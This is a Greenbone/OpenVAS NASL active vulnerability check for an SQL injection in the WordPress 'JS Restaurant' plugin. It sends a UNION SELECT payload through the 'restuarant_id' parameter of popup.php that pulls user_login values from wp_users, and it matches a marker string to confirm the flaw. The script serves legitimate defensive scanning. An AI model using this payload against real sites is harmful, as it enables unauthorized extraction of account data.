# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803697");
  script_version("2025-03-18T05:38:50+0000");
  script_tag(name:"last_modification", value:"2025-03-18 05:38:50 +0000 (Tue, 18 Mar 2025)");
  script_tag(name:"creation_date", value:"2013-07-16 13:11:56 +0530 (Tue, 16 Jul 2013)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("WordPress JS Restaurant Plugin SQLi Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_tag(name:"summary", value:"The WordPress plugin 'JS Restaurant' is prone to an SQL
  injection (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Input passed to 'wp-content/plugins/js-restaurant/popup.php'
  script via 'restuarant_id' parameter is not properly sanitised before being used in a SQL
  query.");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to manipulate SQL
  queries by injecting arbitrary SQL code and gain sensitive information.");

  script_tag(name:"affected", value:"WordPress JS Restaurant Plugin.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"https://packetstorm.news/files/id/122316");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/wordpress-js-restaurant-sql-injection");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + '/wp-content/plugins/js-restaurant/popup.php?restuarant_id=' +
            '-2%20UNION%20SELECT%201,group_concat(user_login,' +
            '0x53514c2d496e6a656374696f6e2d54657374),3,4,5,6,7,8,9,10,11,12,13,14,15,16,' +
            '17,18,19,20,21,22,23,24,25,26,27%20from%20wp_users--+';

if (http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"SQL-Injection-Test",
                    extra_check:make_list("date_restaurant", "selectday_res"))) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
